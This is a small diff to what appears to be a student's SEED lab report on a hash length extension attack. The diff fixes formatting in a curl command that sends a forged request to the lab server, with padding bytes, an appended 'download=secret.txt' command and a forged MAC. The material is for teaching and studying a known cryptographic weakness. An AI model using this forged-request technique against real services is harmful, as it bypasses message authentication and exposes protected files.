@@ -202,7 +202,7 @@ The final URL included:
 * **Command Used:**
 
 ```bash
-<curl "http://www.seedlab-hashlen.com/?myname=GoncaloMoreira&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%70&download=secret.txt&mac=3a3b0ca68cc8fc109d49f72364ab54a715ac9a5e7c4f59b8cee99cc7b0c46ea3">
+curl "http://www.seedlab-hashlen.com/?myname=GoncaloMoreira&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%70&download=secret.txt&mac=3a3b0ca68cc8fc109d49f72364ab54a715ac9a5e7c4f59b8cee99cc7b0c46ea3"
 ```
 
 * **Screenshot(s):**
